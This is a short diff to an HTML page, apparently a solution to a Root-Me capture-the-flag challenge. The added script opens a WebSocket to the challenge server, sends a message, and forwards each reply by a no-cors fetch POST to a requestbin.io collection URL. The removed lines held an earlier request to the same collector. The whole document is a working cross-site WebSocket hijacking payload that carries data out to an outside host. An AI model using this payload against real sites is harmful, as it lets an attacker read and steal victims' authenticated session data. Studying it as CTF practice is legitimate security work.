@@ -2,13 +2,15 @@
 <html>
 <body>
   <script>
-    var request = require('request');
-    var url ='https://requestbin.io/1cyce261'
-    request(url, function (error, response, body) {
-      if (!error) {
-        console.log(body);
-      }
-    });
+    websocket = new WebSocket('wss://ctf02.root-me.org/ws');
+    websocket.onopen = start
+    websocket.onmessage = handleReply
+    function start(event) {
+      websocket.send("attackers-message");
+    }
+    function handleReply(event) {
+      fetch('https://requestbin.io/1cyce261', {method:'POST',mode:'no-cors',body:event.data})
+    }
   </script>
 </body>
 </html>
